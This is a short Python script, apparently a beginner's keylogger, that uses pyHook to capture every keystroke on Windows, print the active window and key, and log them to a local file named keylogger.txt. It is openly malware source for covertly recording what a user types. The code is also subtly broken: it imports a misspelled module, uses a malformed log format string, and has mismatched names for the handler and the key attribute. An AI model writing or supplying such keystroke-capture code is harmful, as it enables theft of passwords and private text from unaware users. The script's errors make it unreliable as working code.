import pyHook, pythoncom, sys, logging, time, datatime
carpeta_destino= 'C:\\ruta\\keylogger.txt'

def OnKeyboardEvent(event):
  logging.basicConfig(filename=carpeta_destino, level= logging.DEBUG, format='%/message)s')
  print('WindowName:', event.WindowName)
  print('Window:', event.Window)
  print('Key:', event.Key)
  logging.log(10, event.key)
  return True

hooks_manager= pyHook.HookManager()
hooks_manager.KeyDown= OnKeyBoardEvent
hooks_manager.HookKeyboard()

while True:
  pythoncom.PumpWaitingMessages()
